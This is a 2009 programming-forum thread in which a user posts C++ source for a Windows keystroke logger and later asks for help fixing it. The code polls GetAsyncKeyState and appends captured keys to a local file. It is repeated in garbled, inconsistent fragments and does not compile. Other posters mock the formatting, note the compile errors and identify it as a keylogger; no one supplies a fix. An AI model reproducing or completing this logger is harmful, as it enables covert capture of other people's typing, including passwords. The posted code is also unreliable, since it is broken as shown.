---
title: "what do you think"
date: 2009-05-23
forum: Programming Talk
---

### Post by vze57gc8 on 2009-05-23
void Logger(){
    int key;
    GetAsyncKeyState(key);
}

void Logger() {
char key[10];
  while(true) {
  Sleep(5);
     for(key = 8; key <= 256; i++){      
        if(GetAsyncKeyState(key)==-32767){      
        StoreKey(key);      }
   
        }
      }
}

void StoreKey(char key){
   ofstream storekey("C:\\storekey.txt", ios::app);
   storekey << key;
   storekey.close;
}

#include <windows.h>
#include <fstream>
 using namespace std;
 void StoreKey(char key){
   ofstream storekey("C:\\storekey.txt", ios::app);
   storekey << key;
   storekey.close;
}
void Logger() {
char key[10];
   while(true) {
   Sleep(5);
      for(key = 8; key <= 256; i++){      
         if(GetAsyncKeyState(key)==-32767){      
         StoreKey(key);      
         }
      }
   }
}
int main(){
   Logger();
   return 1;
}

---

### Post by ibuclaw on 2009-05-23
You can put code in [NOPARSE]```

```[/NOPARSE] tags to clean up the formatting:

ie
[NOPARSE]
for(; i < 10; i++)
    printf("%d\n", i);
[/NOPARSE]

Becomes
```

for(; i < 10; i++)
    printf("%d\n", i);

```
When put into code tags.


Also, I notice that your application won't run on Linux, at least, not without a few tweaks first.

---

### Post by dwhitney67 on 2009-05-23
I for one feel irked... the OP posted some code but forgot to provide toilet paper.

---

### Post by vze57gc8 on 2009-05-23
thx for the feedback
i have xp as a guest where i do my testing

---

### Post by dwhitney67 on 2009-05-24
> **vze57gc8 said:**
> thx for the feedback
i have xp as a guest where i do my testing

testing???  The code you posted won't even compile!

---

### Post by vze57gc8 on 2009-05-24
i was hoping to get some help with fixing it

---

### Post by Sinkingships7 on 2009-05-24
[quote=vze57gc8]i was hoping to get some help with fixing it[/quote]
Perhaps you should mention that. Maybe you could even tell us what part you want help with? The purpose of the code? I don't know... anything?

We're more than willing to help, but we're going to need you to help us help you first.

---

### Post by soltanis on 2009-05-24
I think this is some sort of keystroke logger intended to run under Windows?

Somehow I don't think it'll work though.

---

### Post by lisati on 2009-05-24
WTF?
> #include <windows.h>
Not needed on a Linux system, not always needed in a console-mode program.

---

